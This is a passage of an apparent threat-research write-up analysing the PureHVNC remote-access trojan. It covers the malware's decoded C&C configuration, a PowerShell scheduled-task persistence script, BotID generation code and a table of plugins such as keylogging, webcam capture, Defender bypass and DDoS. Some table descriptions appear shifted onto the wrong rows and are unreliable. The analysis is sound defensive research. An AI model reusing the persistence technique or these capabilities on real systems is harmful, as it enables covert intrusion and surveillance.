+&lt;p&gt;The buffer contains a .NET payload, which is executed via the shellcode. Once the .NET crypter decrypts the final payload using&amp;nbsp;&lt;strong&gt;AES&lt;/strong&gt;&amp;nbsp;and decompresses it using&amp;nbsp;&lt;strong&gt;Gzip&lt;/strong&gt;, it is identified as&amp;nbsp;&lt;strong&gt;PureHVNC&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31866" height="533" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_123532.png" width="389" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 — Deobfuscated .NET Assembly Explorer.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="purehvnc-rat---technical-analysis"&gt;PureHVNC RAT &amp;#8211; Technical Analysis&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;PureHVNC&lt;/strong&gt;&amp;nbsp;is a product of the Pure family of malicious software developed by&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;. The malware provides HVNC capabilities (Hidden Virtual Network Computing), which allows an attacker to control an infected machine without the session being visible to the infected user.&lt;/p&gt;
+
+
+
+&lt;p&gt;The analyzed malware contains obfuscated strings and function calls that are dynamically decrypted. By using&amp;nbsp;&lt;a href="https://github.com/SychicBoy/NETReactorSlayer"&gt;NETReactorSlayer&lt;/a&gt;, we can obtain a cleaner version of this malware.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="configuration"&gt;Configuration&lt;/h3&gt;
+
+
+
+&lt;p&gt;The malware configuration is protobuf s&lt;strong&gt;erialized&lt;/strong&gt;,&amp;nbsp;&lt;strong&gt;Gzip&lt;/strong&gt;&amp;nbsp;compressed, and&amp;nbsp;&lt;strong&gt;Base64&lt;/strong&gt;&amp;nbsp;encoded. The reverse process retrieves the malware configuration, which contains execution configurations such as the command and control server, port number and mutex name.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31867" height="543" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-04_135325-1024x543.png" style="width: 726px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 — Malware Configuration.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The deserialization of the decompressed buffer can be done using the&amp;nbsp;&lt;a href="https://github.com/aj3423/protod"&gt;protod&lt;/a&gt;&amp;nbsp;tool, which gives the following output.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;C:\&gt; protod --hex b202c30d0a0e35342e3139372e3134312e32343510bb0310cb511a880d4d494945346a434341737167417749424167495141504b4f6c6c78707a57456637436967326977515554414e42676b71686b69473977304241513046414441534d52417744675944565151444441645864325a7761485a694d434158445449304d446b784e5445794e4455774e316f59447a6b354f546b784d6a4d784d6a4d314f545535576a41534d52417744675944565151444441645864325a7761485a694d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454133516d2b4f345a58386537716e7a62374163532b4d4b754d6d4e616e3036486746317456337a43393274694c2f51796c43793354665a3147516d75742b634f66755a627939755941794d463734757874777046707236707a4c34707333487870757842727641635273554b56536870517a474f544d776c4a574a6a376e445831546e2f5049723967353543376a54462f6b3933677264474e333845415951536437356778685a37736464435a4675427936426474323155526b6e69704e394e33792f646c444f2b71425a6d625668474745715a31487256443252706d4b4b454f364f5a7534584a484c726e3145736a6778794d306966623750333862522f6344423250787a4f7147525a2f536e68673542772f754738322b7477596b70364378565248353979616d6c487039715246347652464c6b3038785a302b6c526b51563442724557624136306f6d4970335844646e4d4f50465a6e7148554d5442545a3837314c4537383256463334784d3551644941327236516a714e794b53796d622f6c4d634c4a45686c4a2b44456630355932306c45396e4a546e2f696f4d4b4f2f696c737a4a4f6875384e533433672b746f725043454f76446c644266787467637034772b5358584c665569332b702f3332364a5867685270715a555139395661482f756354347250394363536a49716c43796d507541684f5a6d5244794d416357757a737a2f315354675a3866785030445670726470544c764e396e2b65734d505948524543556c615a4c646e397839416d5a4152624d61744f64417a48384c675154473032656356532f70457567555667374970786e367057716a4b2b4e53464e72316b784359493555715a4b35304364494e6f4b4d382b6672413767416c336f686e593462524b366246696f61434363435a4a463746614a4a682b4544732f4351364b634c706e6b434177454141614d794d444177485159445652304f424259454642396a546c4e6561355a734a6437436c44682f6365706b46585a5a4d41384741315564457745422f7751464d414d42416638774451594a4b6f5a496876634e4151454e42514144676749424148336e466e7675504575664d334277504e6668677335526b5050586b3270473963547a6e784552336833376b52336a6775456e7132774c3779594132443330584138744a76372b43505a2f4972745343304f5379456d77386135466f48746e6f32326535447471383146593463386b465453307033396d744145746974414765684d7945364b3358304c67764e6178577762644c3972636b6f36326d7378714b527733667861466a544e4b2b746c35483654386a584835564d714564306569694b357953616e4c6b69792b4366594a6e7971426f49435957347231572f6f3635696267787a506f4f7a63626f64345547394f36597744714d444e384a6c514451546c37675a4c697443526361425a51796e494e4632795a775a5969726457714b3058336668514c6c756f5a397a58686335726233554d352b51765039702f5a61554f495a306d3138766a56636e7a365a6f394e36304b393375355a2f497a42636438674d315770336474447275656b626a64587338622b74784d4446537935365a5042464c4a68574f34787047743137325a4d7036447539734d4157446144546650765a5770724535576a436b34666c744d515530444762506d5031696c33584c7471567650694c767541636372624c39776b766c76444b676a715570596a587364464f5435756e586959633165454457344849574e4a634977324a346f7a384932416c77512b657856544541725163384733664e624d73765a4437437453564a4b715a4c536b41666f6b69335a72732f6649465447474e7a512f56626230314b376b3773326d4151344d72314a6a4e682f5a776c546475624b5a702b6a6241527268447676645049537570536f304b444b426a776b5932746347772f615473594b644e7977446e38567149764c6a4868444b4734764d6d3746596f4c4d64455749584e797650316f4a322207616d617a6f6e333a004207415050444154414a0c616130356265323835303631
+[b2 02] 38 string: (1731)
+    [0a] 1 string: (14) 54.197.141[.]245
+    [10] 2 varint: 443 (0x1bb)
+    [10] 2 varint: 10443 (0x28cb)
+    [1a] 3 string: (1672) MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2
+    [22] 4 string: (7) amazon3 (61 6d 61 7a 6f 6e 33)
+    [3a] 7 string: (0)
+    [42] 8 string: (7) APPDATA (41 50 50 44 41 54 41)
+    [4a] 9 string: (12) aa05be285061&lt;/pre&gt;
+
+
+
+&lt;p&gt;The above configuration stores values in a specific class whose properties are decorated with&amp;nbsp;&lt;code&gt;[ProtoMember(n)]&lt;/code&gt;&amp;nbsp;attributes, indicating that it uses Protocol Buffers (&lt;a href="https://github.com/protobuf-net/protobuf-net"&gt;protobuf-net&lt;/a&gt;) for serialization.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;ProtoMember&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Malware Command and Control Server.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;C&amp;amp;C port.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;TLS certificate, used for C&amp;amp;C communication.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;Campaign ID.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Maintain Persistence flag.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;Flag value, which executes&amp;nbsp;&lt;code&gt;SetThreadExecutionState&lt;/code&gt;&amp;nbsp;Windows API that prevents the system from sleeping or turning off the display.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;Task name, used for maintaining persistence via Scheduled Task. If the field is not defined the executable name is used.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;Environment variable which will be used to retrieve the installation folder. This file path will be used for persistence.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;Mutex name, assuring the malware process is unique.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;Unknown, unused field.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="persistence-1"&gt;Persistence&lt;/h3&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;PureHVNC&lt;/strong&gt;, similar to the Rust Loader described above, maintains its persistence in the system’s Scheduled Task by executing a PowerShell command.&lt;/p&gt;
+
+
+
+&lt;p&gt;When running with admin rights, the malware will execute the following script:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;Register-ScheduledTask `
+    -TaskName '&amp;lt;task_name&gt;' `
+    -Action (
+        New-ScheduledTaskAction -Execute '&amp;lt;executable_path&gt;'
+    ) `
+    -Trigger (
+        New-ScheduledTaskTrigger -Once -At (Get-Date) `
+        -RepetitionInterval (New-TimeSpan -Minutes 5)
+    ) `
+    -User $env:UserName `
+    -**RunLevel Highest** `
+    -Settings (
+        New-ScheduledTaskSettingsSet `
+            -ExecutionTimeLimit (New-TimeSpan -Seconds 0) `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries
+    ) `
+    -Force&lt;/pre&gt;
+
+
+
+&lt;p&gt;When the process runs as a normal user, the command will run without the&amp;nbsp;&lt;code&gt;-RunLevel Highest&lt;/code&gt;&amp;nbsp;option. Depending on the process rights, the appropriate command will be Base64 encoded and then executed using the&amp;nbsp;&lt;code&gt;-Enc&lt;/code&gt;&amp;nbsp;PowerShell parameter.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31868" height="292" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-04_161448-1024x292.png" style="width: 718px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 — Encodes command with Base64 and executes PowerShell.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="network-communication"&gt;Network Communication&lt;/h3&gt;
+
+
+
+&lt;p&gt;The malware initially tries to check if the endpoint is currently alive, first trying to&amp;nbsp;&lt;code&gt;Connect&lt;/code&gt;&amp;nbsp;via socket and then sends four bytes to the C&amp;amp;C&amp;nbsp;&lt;code&gt;04 00 00 00&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31870" height="369" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-04_162711.png" style="width: 515px; height: auto;" width="767" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 — Initial communication.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The malware creates an SSLStream and performs an SSL handshake, verifying the server’s certificate against a certificate embedded in its configuration.&lt;/p&gt;
+
+
+
+&lt;p&gt;During this stage,&amp;nbsp;&lt;strong&gt;PureHVNC&lt;/strong&gt;&amp;nbsp;collects Bot information that will be sent to the attacker’s server. This information will be serialized and then compressed using&amp;nbsp;&lt;strong&gt;Gzip&lt;/strong&gt;. If the compressed data exceeds approximately 1 MB (1,000,000 bytes), it will be sent in 16 KB chunks. &lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31871" height="534" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-04_172057.png" style="width: 626px; height: auto;" width="958" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 — Compressed data into chunks.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once data is sent,&amp;nbsp;&lt;strong&gt;PureHVNC&lt;/strong&gt;&amp;nbsp;receives the compressed buffer size from the C&amp;amp;C via an SSL stream and reads the entire buffer into an array. After decompressing and deserializing the data, the malware executes the received command in a separate thread.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31872" height="423" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-07_102710.png" style="width: 656px; height: auto;" width="912" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 — Command execution in a separate Thread.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="collected-data"&gt;Collected Data&lt;/h3&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;PureHVNC&lt;/strong&gt;&amp;nbsp;collects and sends data from the infected system to the C&amp;amp;C server. This includes installed antivirus products, bot identifier, user domain and privileges, OS version, executable filename, idle time, and installed applications of interest. The information also contains metadata such as the malware version (&lt;code&gt;4.1.9&lt;/code&gt;) and campaign ID (&lt;code&gt;amazon3&lt;/code&gt;) obtained from the malware configuration.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31873" height="438" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-04_163753-1024x438.png" style="width: 692px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 — Data sent to C&amp;amp;C.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To retrieve the Antivirus products queries Windows Management Instrumentation (WMI) for installed antivirus products on the system,&amp;nbsp;&lt;code&gt;"SELECT * FROM AntiVirusProduct”&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;In addition to collecting information about installed antivirus products, the malware also checks for the presence of specific applications of interest on the host system. It scans predefined directories, files, and registry keys associated with known crypto wallet software, browser extensions, and messaging or email clients to find them (see&amp;nbsp;&lt;strong&gt;Appendix&lt;/strong&gt;).&lt;/p&gt;
+
+
+
+&lt;p&gt;Among the data sent to the C&amp;amp;C, there are three pieces of information that can also serve as anti-sandbox indicators, helping the attacker determine whether the bot resides on a real user system or within a sandboxed or virtualized analysis environment.&lt;/p&gt;
+
+
+
+&lt;p&gt;The first technique returns a Boolean value indicating whether the infected machine has any devices recognized as cameras or imaging devices. This is determined by executing the WMI query,&amp;nbsp;&lt;code&gt;SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')&lt;/code&gt;. Sandboxes and virtual machines often lack physical devices like webcams or imaging devices, and the absence of such devices can indicate a non-physical environment.&lt;/p&gt;
+
+
+
+&lt;p&gt;The second collected data retrieves the tick count of the last input event (keyboard/mouse) and the last user activity on the machine. The third one is the executable name and path, that during this campaign the malware was installed in a fixed folder. This three information combined could be used by the attacker to determine whether the infected machine is a real user or not.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="plugins-commands"&gt;Plugins &amp;amp; Commands&lt;/h3&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;PureHVNC&lt;/strong&gt;&amp;nbsp;stores plugins inside the registry key. The registry key uses the BotID, while the name and value are received by the C&amp;amp;C. The data of the plugin is compressed and reversed, and each time the plugin is loaded, it reverses the bytes and decompresses the buffer. The registry path is located at&amp;nbsp;&lt;code&gt;HKEY_CURRENT_USER\Software\{BOT_ID}&lt;/code&gt;&amp;nbsp;and the Bot ID is generated with the following Python logic:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;# PureHVNC BotID generation logic
+import hashlib
+
+class PureBotID:
+    def __init__(self, user_name: str, domain_name: str, processor_id: str, drive_sn: str, memory_sn: str):
+        # Environment.UserName
+        self.user_name = user_name
+        # Environment.UserDomainName
+        self.domain_name = domain_name
+        # "Win32_Processor", "ProcessorId"
+        self.processor_id = processor_id
+        # "Win32_DiskDrive", "SerialNumber"
+        self.drive_sn = drive_sn
+        # "Win32_PhysicalMemory", "SerialNumber"
+        self.memory_sn = memory_sn
+        # generating Bot ID PureHVNC logic
+        self.bot_id = self.generate_bot_id()
+
+    def generate_bot_id(self) -&gt; str:
+        user_domain = f"{self.user_name}[{self.domain_name}]" if self.domain_name else self.user_name
+        result = f"{self.processor_id}{self.drive_sn}{self.memory_sn}{self.domain_name}{user_domain}"
+        return hashlib.md5(result.encode()).hexdigest().upper()&lt;/pre&gt;
+
+
+
+&lt;p&gt;Once the plugin is delivered to the infected victim, the threat actor can execute various commands. The majority of the commands have a one-on-one relation with the plugin, meaning that the plugin serves only one functionality, though some plugins serve multiple commands. Observed Plugins &amp;amp; supported Commands:&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Plugin&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Supported Commands&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;td&gt;No operation.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;1&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteHiddenVNC&lt;/td&gt;&lt;td&gt;HvncRunpe&lt;/td&gt;&lt;td&gt;Hidden Virtual Network Computing (HVNC) feature under a separate process.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteHiddenVNCAudio&lt;/td&gt;&lt;td&gt;EnableAudio&lt;/td&gt;&lt;td&gt;HVNC with audio enabled.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteAudio&lt;/td&gt;&lt;td&gt;RemoteMic&lt;/td&gt;&lt;td&gt;Captures live audio from the infected system’s microphone.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;4&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;TaskManager&lt;/td&gt;&lt;td&gt;ProcessManager&lt;/td&gt;&lt;td&gt;Displays, kills, restarts processes.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;5&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;FileManager&lt;/td&gt;&lt;td&gt;FileManager&lt;/td&gt;&lt;td&gt;Displays, kills, and restarts processes.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;6&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Executing&lt;/td&gt;&lt;td&gt;DownloadAndExecuteDisk&lt;br /&gt;DownloadAndExecuteMemory&lt;br /&gt;DownloadAndUpdate&lt;/td&gt;&lt;td&gt;Executes computer-related commands such as Restarting, Shutting down PC and offers multiple Bot-C&amp;amp;C connection related features.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;7&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteCamera &lt;/td&gt;&lt;td&gt;RemoteWebcam &lt;/td&gt;&lt;td&gt;Activates the victim’s webcam and streams or captures images/video.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;8&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteShell&lt;/td&gt;&lt;td&gt;RemoteShell&lt;/td&gt;&lt;td&gt;Remote Shell plugin and command.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteDesktop&lt;/td&gt;&lt;td&gt;RemoteDesktop &lt;/td&gt;&lt;td&gt;Remote Desktop plugin and command.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;11&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;PcOption&lt;/td&gt;&lt;td&gt;DeletePlugins&lt;br /&gt;CloseConnection&lt;br /&gt;RestartConnection&lt;br /&gt;UninstallConnection&lt;br /&gt;ShutdownPC&lt;br /&gt;RestartPC&lt;br /&gt;BlockConnection&lt;/td&gt;&lt;td&gt;Executes computer-related commands such as restarting, shutting down the PC and offers multiple Bot-C&amp;amp;C connection-related features.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;12&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Chat&lt;/td&gt;&lt;td&gt;Chat&lt;/td&gt;&lt;td&gt;Command allowing real-time text communication between the operator and the remote client.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;13&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Keylogger&lt;/td&gt;&lt;td&gt;RemoteKeylogger&lt;/td&gt;&lt;td&gt;Keylogging capabilities.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;14&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;VisitWebsite&lt;/td&gt;&lt;td&gt;VisitWebsite&lt;/td&gt;&lt;td&gt;Visits specified website for a specified duration.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;15&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RevProxy&lt;/td&gt;&lt;td&gt;RevProxyHttp&lt;br /&gt;RevProxySocks5&lt;/td&gt;&lt;td&gt;Reverse proxy supporting HTTP and SOCKS5.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;16&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;TV&lt;/td&gt;&lt;td&gt;TV&lt;/td&gt;&lt;td&gt;Unknown, currently not used plugin-command.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;17&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;ExecutePowershell&lt;/td&gt;&lt;td&gt;DefednerExclusion&lt;br /&gt;PowershellOneLiner&lt;br /&gt;DeleteRestorePoints&lt;/td&gt;&lt;td&gt;Executes PowerShell specified one-liner command. As well executes PowerShell to bypass Windows Defender.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;18&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RemoteHiddenVNC_Reflection&lt;/td&gt;&lt;td&gt;RemoteHvncReflection&lt;/td&gt;&lt;td&gt;Terminates Bot, with the option to delete.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;19&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;TwitchBot&lt;/td&gt;&lt;td&gt;TwitchBot&lt;/td&gt;&lt;td&gt;Twitch Bot command is capable of sending a message to the Chat, following, unfollowing an account, clicking on ads.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;20&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;YoutubeBot&lt;/td&gt;&lt;td&gt;YoutubeBot&lt;/td&gt;&lt;td&gt;YouTube Bot performs subscribe, unsubscribe to a specified account, send message, Like actions and click ads.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;21&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;BotKiller&lt;/td&gt;&lt;td&gt;BotKiller&lt;br /&gt;BotKillerWtihDelete&lt;/td&gt;&lt;td&gt;Retrieves machine specs.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;22&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;WindowNotify&lt;/td&gt;&lt;td&gt;WindowNotify&lt;/td&gt;&lt;td&gt;Alerts threat actor once a window caption matching specified keywords is opened.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;23&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RegistryManager&lt;/td&gt;&lt;td&gt;RegistryManager&lt;/td&gt;&lt;td&gt;Remote Registry editor, Delete, Create, Edit values and keys.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;24&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;NetworkManager&lt;/td&gt;&lt;td&gt;NetworkManager&lt;/td&gt;&lt;td&gt;Allows threat actor to view active network connections, refresh connections list, kill specified connection, or terminate process with specific connection.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;25&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;DDOS&lt;/td&gt;&lt;td&gt;DdosManager&lt;/td&gt;&lt;td&gt;Distributed Denial of Service (DDOS) against specified target. Three types of DDOS are supported: 1) HTTP Flood, 2) TCP Flood and 3) HTTP Bandwidth Exhaustion&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;26&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;PCSpecifications&lt;/td&gt;&lt;td&gt;PCSpecifications&lt;/td&gt;&lt;td&gt;Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in the exfiltration of huge 